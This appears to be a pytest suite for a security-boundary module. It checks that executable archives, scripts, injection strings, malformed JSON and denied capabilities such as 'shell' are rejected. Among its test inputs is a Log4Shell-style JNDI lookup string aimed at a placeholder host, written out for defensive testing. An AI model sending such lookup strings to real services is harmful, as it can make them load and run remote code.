import pytest

from qso_runtime.security_boundary import (
    SecurityBoundaryError,
    SecurityLimits,
    enforce_capability_boundary,
    inspect_artifact,
    safe_json_loads,
    sanitize_external_text,
)


def test_rejects_java_archives_and_archive_magic() -> None:
    verdict = inspect_artifact("phantomblock.jar", b"PK\x03\x04malicious")
    assert verdict.accepted is False
    assert any("executable" in reason for reason in verdict.reasons)
    assert any("archive magic" in reason for reason in verdict.reasons)


def test_rejects_renamed_archives_and_parameterized_executable_media() -> None:
    renamed = inspect_artifact("finding.bin", b"\x1f\x8bpayload")
    typed = inspect_artifact(
        "finding.dat",
        b"plain",
        media_type="Application/Java-Archive; charset=binary",
    )
    assert renamed.accepted is False
    assert typed.accepted is False
    assert typed.media_type == "application/java-archive"


def test_rejects_script_shebang_without_script_suffix() -> None:
    verdict = inspect_artifact("finding.txt", b"#!/bin/sh\necho unsafe")
    assert verdict.accepted is False
    assert any("script magic" in reason for reason in verdict.reasons)


def test_rejects_lookup_injection_and_control_characters() -> None:
    with pytest.raises(SecurityBoundaryError):
        sanitize_external_text("${jndi:ldap://example.invalid/a}")
    with pytest.raises(SecurityBoundaryError):
        sanitize_external_text("hidden\x1bcontrol")


def test_normalizes_line_endings_without_changing_safe_text() -> None:
    assert sanitize_external_text("a\r\nb\rc") == "a\nb\nc"


def test_safe_json_enforces_depth() -> None:
    with pytest.raises(SecurityBoundaryError):
        safe_json_loads("[[[[1]]]]", SecurityLimits(max_json_depth=2))


def test_safe_json_rejects_duplicate_keys() -> None:
    with pytest.raises(SecurityBoundaryError, match="duplicate JSON object key"):
        safe_json_loads('{"role":"reader","role":"shell"}')


@pytest.mark.parametrize("constant", ["NaN", "Infinity", "-Infinity"])
def test_safe_json_rejects_non_finite_numbers(constant: str) -> None:
    with pytest.raises(SecurityBoundaryError, match="non-finite JSON number"):
        safe_json_loads(f'{{"value":{constant}}}')


def test_safe_json_rejects_unsupported_payload_types() -> None:
    with pytest.raises(SecurityBoundaryError):
        safe_json_loads(bytearray(b"{}"))  # type: ignore[arg-type]


def test_security_limits_must_be_positive_integers() -> None:
    with pytest.raises(SecurityBoundaryError):
        SecurityLimits(max_json_nodes=0)
    with pytest.raises(SecurityBoundaryError):
        SecurityLimits(max_text_chars=True)  # type: ignore[arg-type]


def test_denied_and_unknown_capabilities_fail_closed() -> None:
    with pytest.raises(SecurityBoundaryError, match="denied QSO capabilities"):
        enforce_capability_boundary({"reasoning", "shell"})
    with pytest.raises(SecurityBoundaryError, match="unsupported QSO capabilities"):
        enforce_capability_boundary({"reasoning", "root_access"})
    with pytest.raises(SecurityBoundaryError, match="malformed QSO capabilities"):
        enforce_capability_boundary({"reasoning", "SHELL"})


def test_bounded_capabilities_are_allowed() -> None:
    enforce_capability_boundary(
        {"reasoning", "artifact_hashing", "bounded_json_parse", "text_sanitization"}
    )


def test_plain_research_artifact_is_hashable_but_not_cleared_as_safe() -> None:
    verdict = inspect_artifact(
        "finding.md",
        b"Unverified threat hypothesis",
        media_type="Text/Markdown; charset=utf-8",
    )
    assert verdict.accepted is True
    assert verdict.media_type == "text/markdown"
    assert len(verdict.sha256) == 64


def test_oversized_artifact_is_rejected_with_deterministic_hash() -> None:
    verdict = inspect_artifact(
        "finding.md",
        b"1234",
        limits=SecurityLimits(max_artifact_bytes=3),
    )
    assert verdict.accepted is False
    assert verdict.reasons == ("artifact exceeds configured size limit",)
    assert len(verdict.sha256) == 64
